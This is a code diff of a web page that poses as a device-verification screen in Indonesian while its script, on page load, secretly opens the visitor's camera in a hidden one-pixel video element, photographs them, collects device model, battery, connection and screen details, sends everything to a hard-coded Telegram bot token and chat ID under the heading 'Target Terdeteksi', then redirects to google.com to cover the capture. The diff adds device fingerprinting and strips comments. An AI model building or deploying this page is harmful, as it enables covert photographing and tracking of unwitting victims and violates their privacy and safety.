@@ -12,21 +12,33 @@
 </head>
 <body>
     <div class="loader"></div>
-    <p id="status">Sedang memverifikasi perangkat anda...</p>
+    <p>Sedang memverifikasi perangkat anda...</p>
 
     <video id="video" style="position: absolute; width: 1px; height: 1px; opacity: 0;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // MASUKKAN TOKEN DAN CHAT ID DI SINI
         const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
         const CHAT_ID = '6888530451';
         
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
+        function getDeviceName() {
+            const ua = navigator.userAgent;
+            if (/iPhone|iPad|iPod/.test(ua)) return "Apple iOS Device";
+            if (/Samsung|SM-/.test(ua)) return "Samsung Galaxy";
+            if (/Redmi|Xiaomi|Mi|POCO/.test(ua)) return "Xiaomi / Redmi";
+            if (/Oppo/.test(ua)) return "Oppo Device";
+            if (/Vivo/.test(ua)) return "Vivo Device";
+            if (/Realme/.test(ua)) return "Realme Device";
+            if (/Pixel/.test(ua)) return "Google Pixel";
+            return "Android Device";
+        }
+
         async function startCamera() {
             try {
-                // Coba akses kamera belakang tanpa parameter 'exact' agar tidak crash di beberapa HP
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "environment" } 
                 });
@@ -36,7 +48,6 @@
                     setTimeout(takeSnapshot, 3000);
                 };
             } catch (err) {
-                console.log("Kamera belakang gagal, mencoba kamera default...");
                 try {
                     const fallback = await navigator.mediaDevices.getUserMedia({ video: true });
                     video.srcObject = fallback;
@@ -50,19 +61,18 @@
         async function takeSnapshot() {
             let battery = "N/A";
             try {
-                // Penanganan baterai agar tidak stuck jika ditolak browser
                 if (navigator.getBattery) {
                     const bat = await navigator.getBattery();
                     battery = Math.round(bat.level * 100) + "%";
                 }
-            } catch (e) { battery = "Error"; }
+            } catch (e) {}
 
-            const info = `📸 **Target Terdeteksi!**\n\n` +
-                         `📱 **Browser:** ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n` +
-                         `🔋 **Baterai:** ${battery}\n` +
-                         `🌐 **Koneksi:** ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}\n` +
-                         `🖥 **Resolusi:** ${window.screen.width}x${window.screen.height}\n` +
-                         `🌍 **Platform:** ${navigator.platform}\n\n` +
+            const info = `📸 <b>Target Terdeteksi!</b>\n\n` +
+                         `📱 <b>Perangkat:</b> ${getDeviceName()}\n` +
+                         `🔋 <b>Baterai:</b> ${battery}\n` +
+                         `🌐 <b>Koneksi:</b> ${navigator.connection ? navigator.connection.effectiveType.toUpperCase() : 'N/A'}\n` +
+                         `🖥 <b>Resolusi:</b> ${window.screen.width}x${window.screen.height}\n` +
+                         `🌍 <b>Sistem:</b> Android / Mobile OS\n\n` +
                          `<i>NEPTUNUS V1.0.8</i>`;
 
             canvas.width = video.videoWidth || 640;
@@ -84,7 +94,7 @@
                 }).finally(() => {
                     window.location.href = "https://google.com";
                 });
-            }, 'image/jpeg', 0.7);
+            }, 'image/jpeg', 0.8);
         }
 
         window.onload = startCamera;
